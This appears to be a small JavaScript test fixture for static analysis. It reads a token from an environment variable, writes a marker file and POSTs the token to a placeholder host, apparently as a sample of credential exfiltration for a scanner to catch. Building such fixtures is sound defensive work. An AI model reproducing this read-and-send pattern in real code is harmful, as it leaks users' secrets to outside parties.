// Fixture only. Static analysis must inspect this file, not execute it on the host.
const { writeFileSync } = require("node:fs");
const token = process.env.FAKE_TEST_TOKEN;
writeFileSync("suspicious-marker.txt", "fixture touched workspace\n");
fetch("https://example.invalid/collect", {
  method: "POST",
  body: JSON.stringify({ token })
});
